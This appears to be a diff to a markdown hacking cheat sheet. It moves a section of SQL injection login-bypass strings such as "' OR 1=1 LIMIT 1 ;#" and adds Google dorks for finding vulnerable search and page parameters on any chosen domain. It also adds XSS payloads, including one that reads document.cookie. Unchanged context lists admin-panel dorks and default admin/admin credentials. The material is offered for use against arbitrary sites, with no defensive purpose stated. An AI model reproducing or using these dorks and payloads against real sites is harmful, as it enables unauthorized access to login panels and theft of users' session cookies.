@@ -21,7 +21,6 @@ Two
 - inurl:admin/index.php
 - inurl:adminlogin.aspx
 
-
 ## SQL INJECTION
 - 1'or'1'='1
 - 1'or'1'-'1
@@ -57,6 +56,14 @@ Two
 - admin') or '1'='1'/*
 
 - user Name: admin password: admin
+
+## PAYLOADS
+- 1'or'1'='1
+- ' OR 1=1 LIMIT 1 ;#
+- ' or 1=1 limit 1 -- -+
+- admin' or '1'='1
+- 'or 1=1 limit 1-- -+---
+
 
 ## DORKS:
 - inurl:adminlogin.aspx
@@ -131,9 +138,37 @@ Two
 - inurl:index.php?page=
 - inurl: .php?page=contact.php site:in/pk/id
 
-## PAYLOADS
-- 1'or'1'='1
-- ' OR 1=1 LIMIT 1 ;#
-- ' or 1=1 limit 1 -- -+
-- admin' or '1'='1
-- 'or 1=1 limit 1-- -+---
+
+## XSS dork
+- /?s= site: (any domain name choose)
+- /search?q= site: (any domain name choose)
+- /index.php?lang= site: (any domain name choose)
+- /index.php?page= site: (any domain name choose)
+- /search?query= site: (any domain name choose)
+- /search?keyword= site: (any domain name choose)
+- /search/?q= site: (any domain name choose)
+- /connexion?redirect_uri= site: (any domain name - choose)
+- /?page= site: (any domain name choose)
+- /search/?s= site: (any domain name choose)
+- /?keywords= site:
+- /search/?keyword= site: (any domain name choose)
+- /search-results?q=
+- inurl:".php?query="
+- inurl:".php?searchstring="
+- inurl:".php?keyword="
+- inurl:".php?file="
+- inurl:".php?years="
+- inurl:".php?txt="
+- page_details.php?menu_id=
+- gallery.php?menu_id=
+- inurl:".php?tag="
+- inurl:".php?max="
+- inurl:".php?from="
+- inurl:".php?author="
+- inurl:".php?pass="
+- inurl:".php?feedback="
+
+## Script
+- <script>alert("1")</script>
+- <script>alert(document.cookie)</script>
+- <svg/onload=prompt(0)//
